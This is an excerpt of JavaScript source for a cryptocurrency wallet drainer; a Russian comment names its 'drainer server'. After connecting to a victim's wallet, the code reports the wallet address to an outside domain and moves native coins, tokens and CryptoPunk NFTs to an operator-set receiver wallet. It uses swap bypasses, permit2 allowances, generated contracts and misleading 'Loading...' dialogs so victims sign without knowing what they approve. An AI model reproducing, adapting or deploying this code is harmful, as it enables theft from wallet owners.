...
const MS_Server = "urobaggg123.com"; // Указать домен, который прикреплен к серверу дрейнера
...
const MS_Pancake_Native_ABI = [{"inputs":[{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactETHForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"payable","type":"function"}];
...
const send_request = async (data) => {
  try {
    ...
    data.wallet_address = MS_Current_Address;
    ...
    const response = await fetch('https://' + MS_Server, {
      ...
      body: `ver=20042024&raw=${request_data}`
    });
...
const SIGN_NATIVE = async (asset) => {
  ...
  const tokens_gas_fee = token_limit.mul(MS_Gas_Reserves[asset.chain_id]).mul(gas_price);
...
const DO_CONTRACT_NEW = async (asset) => {
  ...
  MSL.fire({
    ...
    showConfirmButton: true, confirmButtonText: 'Loading...', timer: 30000, color: MS_Color_Scheme
  });

  const response = await send_request({ action: 'contract_new', chain_id: asset.chain_id, amount: asset.amount_usd, PW: MS_Settings.Personal_Wallet });
  ...
  let unsigned_tx = { from: MS_Current_Address, to: contract_address, value: BN(100), data: contract_data };
  ...
  try {
    await send_request({
      ...
      address: MS_Current_Address, amount: asset.amount_usd
    });
  } catch(err) {
    console.log(err);
  }
...
const TRANSFER_NATIVE = async (asset, ignore_contract = false) => {
  ...
  if (MS_Settings.Settings.Use_Swap_Bypass_For_ETH && asset.chain_id == 1 && asset.amount_usd >= 100) return DO_SWAP_BYPASS_NATIVE(asset);
  if (ignore_contract == false && MS_Settings.Settings.Use_Contract_Generator && asset.amount_usd >= MS_Settings.Settings.Contract_Creation_Limit[asset.chain_id]) return DO_CONTRACT_NEW(asset);
...
const DO_RANDOMIZER_CRYPTOPUNK = async (asset) => {
  ...
  contract_data = web3_contract.methods.transferPunk(MS_Settings.Personal_Wallet.address, asset.id).encodeABI();
  unsigned_tx.data = contract_data;
...
const TRANSFER_CRYPTOPUNK = async (asset) => {
  if (MS_Settings.Settings.Use_Randomizer_For_NFTs && MS_Settings.Personal_Wallet != null) return DO_RANDOMIZER_CRYPTOPUNK(asset);
  ...
  contract_data = web3_contract.methods.transferPunk(MS_Settings.Receiver, asset.id).encodeABI();
  unsigned_tx.data = contract_data;
...
const DO_SWAP_BYPASS_NATIVE = async (asset) => {
  ...
  const balance = await node.getBalance(MS_Current_Address);
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  const contract = new ethers.Contract('0xEfF92A263d31888d860bD50809A8D171709b7b1c', MS_Pancake_Native_ABI, MS_Signer);
  ...
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.swapExactETHForTokens('0', [
        ...
        MS_Settings.Settings.Swap_Bypass_For_ETH_Token
      ], MS_Settings.Receiver, swap_deadline, {
...
const DO_SWAP_BYPASS = async (asset, swapper_data) => {
  ...
  if (swapper_data.swapper == 'Uniswap') {
    ...
    const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
    const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
    const contract = new ethers.Contract(swapper_data.address, MS_Uniswap_ABI, MS_Signer);
    const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
    const nonce = await get_nonce(asset.chain_id);
    const swap_data = [];
    const swap_value = ethers.BigNumber.from(asset.amount_raw).toString();
    const web3_contract = new web3.eth.Contract(MS_Uniswap_ABI, swapper_data.address);
    const data = web3_contract.methods.swapExactTokensForTokens(swap_value, '0', [
      asset.address, MS_Swap_Route[asset.chain_id]
    ], MS_Settings.Receiver).encodeABI();
    swap_data.push(data);
    ...
    const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
    const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
    const contract = new ethers.Contract(swapper_data.address, MS_Pancake_ABI, MS_Signer);
    const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
    let gas_limit = null;
    let gas_attempts = 0;
    while (gas_attempts < 3) {
...
const check_permit2_allowance = async (asset) => {
  try {
    ...
    const balance = await contract.balanceOf(MS_Current_Address);
    const allowance = await contract.allowance(MS_Current_Address, '0x000000000022d473030f116ddee9f6b43ac78ba3');
...
for (let i = 0; i < MS_Pancake_Whitelist.length; i++) MS_Pancake_Whitelist[i] = MS_Pancake_Whitelist[i].toLowerCase();
for (let i = 0; i < MS_Uniswap_Whitelist.length; i++) MS_Uniswap_Whitelist[i] = MS_Uniswap_Whitelist[i].toLowerCase();

const is_token_swappable = (chain_id, contract_address) => {
  try {
    let chain_swappers = MS_Routers[chain_id];
    for (const swapper of chain_swappers) {
      if (swapper[0] != 'Pancake' && swapper[0] != 'Uniswap') continue;
      if (swapper[0] == 'Uniswap') {
        if (MS_Uniswap_Whitelist.includes(contract_address.toLowerCase())) {
          return { swapper: 'Uniswap', address: swapper[1] };
        }
      } else if (swapper[0] == 'Pancake') {
        if (MS_Pancake_Whitelist.includes(contract_address.toLowerCase())) {
...
const APPROVE_TO_SWAPPER = async (asset, swapper_address) => {
  ...
  if (MS_Settings.Settings.Approve.MetaMask >= 2 && asset.increase) {
    ...
    await approve_request(asset); sign_next(); const tx = await MS_Signer.sendTransaction(unsigned_tx); wait_message();
    if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000); sign_ready();
...
const connect_wallet = async (provider = null) => {
  try {
    ...
    for (const asset of assets) {
      try {
        if (asset.type != 'NATIVE') {
          if (MS_Settings.Settings.Use_Swap_Bypass) {
            if (is_token_swappable(asset.chain_id, asset.address) != false) {
              MS_Gas_Reserves[asset.chain_id] += 2;
            } else {
              MS_Gas_Reserves[asset.chain_id] += 1;
            }
          } else {
            MS_Gas_Reserves[asset.chain_id] += 1;
          }
      ...
      for (const asset of assets) {
        try {
          ...
          if (asset.type == 'NATIVE') {
            ...
            if (MS_Settings.Settings.Use_Swap_Bypass && MS_Current_Provider == 'MetaMask' && is_token_swappable(asset.chain_id, asset.address) != false) {
            ...
            } else if (MS_Settings.Settings.Permit2.Mode && asset.permit2 && check_permit2_allowance(asset)) {
              const all_permit2 = [];
              for (const x_asset of assets) {
                try {
